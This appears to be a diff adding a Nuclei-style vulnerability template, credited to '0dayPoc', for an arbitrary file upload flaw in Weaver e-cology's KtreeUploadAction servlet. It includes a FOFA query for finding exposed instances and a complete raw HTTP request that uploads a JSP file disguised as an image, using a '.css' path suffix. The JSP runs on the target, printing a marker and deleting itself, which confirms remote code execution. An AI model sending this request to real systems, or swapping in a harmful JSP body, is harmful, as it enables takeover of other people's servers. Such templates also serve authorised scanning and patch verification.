@@ -1,0 +1,32 @@
+id: weaver-e-cology-upload
+
+info:
+  name: "泛微 e-cology 任意文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app:"e-cology"
+          上海泛微网络科技股份有限公司 e-cology 系统的 /com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction 接口存在任意文件上传缺陷。攻击者可通过构造恶意请求上传可执行文件，结合服务器端文件解析机制实现远程代码执行，最终可能导致目标系统权限被完全控制。
+  tags: 泛微
+
+http:
+- raw:
+  - |
+    POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction/.css?action=image HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=ce2c603de19573a853c8facc8cf14425
+
+    --ce2c603de19573a853c8facc8cf14425
+    Content-Disposition: form-data; name="files"; filename="NTest.jsp"
+    Content-Type: image/jpeg
+
+    <% out.println("NdayTest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+    --ce2c603de19573a853c8facc8cf14425--
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
